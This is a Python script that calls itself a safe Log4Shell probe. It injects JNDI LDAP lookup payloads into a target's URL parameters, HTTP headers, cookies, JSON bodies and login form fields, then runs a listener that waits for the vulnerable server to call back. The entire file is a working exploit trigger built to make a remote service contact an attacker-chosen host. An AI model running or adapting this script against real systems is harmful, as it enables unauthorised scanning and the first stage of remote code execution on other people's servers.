#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import http.client
import json
import socket
import socketserver
import threading
import time
import urllib.parse
from datetime import datetime
from typing import List

BANNER = "[*] "

class QuietTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

class LDAPProbeHandler(socketserver.BaseRequestHandler):
    # 只是记录是否有连接/数据，不实现LDAP协议
    def handle(self):
        peer = f"{self.client_address[0]}:{self.client_address[1]}"
        try:
            self.server.hits.append((time.time(), peer))
            # 读一点点数据以便记录
            self.request.settimeout(2)
            _ = self.request.recv(1024)
        except Exception:
            pass

def start_ldap_listener(bind_host: str, bind_port: int):
    server = QuietTCPServer((bind_host, bind_port), LDAPProbeHandler)
    server.hits = []  # list of (ts, peer)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"{BANNER}LDAP probe listening on {bind_host}:{bind_port}")
    return server

def http_try(host: str, port: int, method: str, path: str, headers: dict, body: bytes = None, timeout=5):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        _ = resp.read()  # 消耗响应体
        code = resp.status
        print(f"{BANNER}HTTP {method} {host}:{port}{path} -> {code}")
    except Exception as e:
        print(f"{BANNER}HTTP {method} {host}:{port}{path} -> ERROR {e}")
    finally:
        conn.close()

def build_payload(cb_host: str, ldap_port: int, token: str) -> str:
    # 经典探测 payload
    return f"${{jndi:ldap://{cb_host}:{ldap_port}/{token}}}"

def spray_requests(target_host: str, ports: List[int], cb_host: str, ldap_port: int, paths: List[str]):
    token = datetime.utcnow().strftime("%Y%m%d%H%M%S")
    payload = build_payload(cb_host, ldap_port, token)
    print(f"{BANNER}Using token: {token}")
    print(f"{BANNER}Payload: {payload}")

    # 多位置注入尝试
    header_sets = [
        {"User-Agent": payload},
        {"X-Api-Version": payload},
        {"Referer": payload},
        {"X-Forwarded-For": payload},
        {"Cookie": f"session={urllib.parse.quote(payload)}"}
    ]

    for p in ports:
        for base in paths:
            # 1) GET 参数注入
            path_q = f"{base}?q={urllib.parse.quote(payload)}"
            http_try(target_host, p, "GET", path_q, {"User-Agent": "probe"})
            # 2) 不同 Header 注入
            for hs in header_sets:
                hdrs = {"User-Agent": "probe"}
                hdrs.update(hs)
                http_try(target_host, p, "GET", base, hdrs)
            # 3) JSON/表单提交
            body_json = json.dumps({"search": payload, "note": "probe"}).encode()
            http_try(target_host, p, "POST", base, {"Content-Type": "application/json"}, body_json)
            form = f"username=admin&password={urllib.parse.quote(payload)}".encode()
            http_try(target_host, p, "POST", base, {"Content-Type": "application/x-www-form-urlencoded"}, form)

    return token

def main():
    parser = argparse.ArgumentParser(description="Safe Log4Shell probe (no RCE) — sends JNDI payloads and listens on LDAP.")
    parser.add_argument("--target", default="10.11.1.10", help="Target host")
    parser.add_argument("--ports", default="8080,8081", help="Comma-separated target ports")
    parser.add_argument("--cb-host", default="172.16.1.1", help="Callback (your) host reachable by target")
    parser.add_argument("--ldap-port", type=int, default=1389, help="Local LDAP probe port")
    parser.add_argument("--paths", default="/,/login,/search", help="Comma-separated paths to try")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Bind address for LDAP listener")
    parser.add_argument("--wait", type=int, default=30, help="Seconds to wait for callbacks after spraying")
    args = parser.parse_args()

    ports = [int(x) for x in args.ports.split(",") if x.strip()]
    paths = [x.strip() for x in args.paths.split(",") if x.strip()]

    # 小检查：cb-host 是否本机可绑定/可达由用户保证；这里仅提示
    try:
        socket.gethostbyname(args.cb_host)
    except Exception:
        print(f"{BANNER}Warning: cannot resolve {args.cb_host}, continue anyway.")

    ldap_server = start_ldap_listener(args.listen_host, args.ldap_port)
    token = spray_requests(args.target, ports, args.cb_host, args.ldap_port, paths)

    print(f"{BANNER}Waiting up to {args.wait}s for callbacks…")
    t0 = time.time()
    while time.time() - t0 < args.wait:
        if ldap_server.hits:
            break
        time.sleep(1)

    if ldap_server.hits:
        print(f"{BANNER}==> CALLBACK RECEIVED! Potential Log4Shell triggered.")
        for ts, peer in ldap_server.hits:
            ts_str = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            print(f"{BANNER}  {ts_str}Z from {peer}")
        print(f"{BANNER}Token used: {token}")
    else:
        print(f"{BANNER}No callbacks observed. Target may be patched, filtered, or payload not logged.")

    ldap_server.shutdown()

if __name__ == "__main__":
    main()
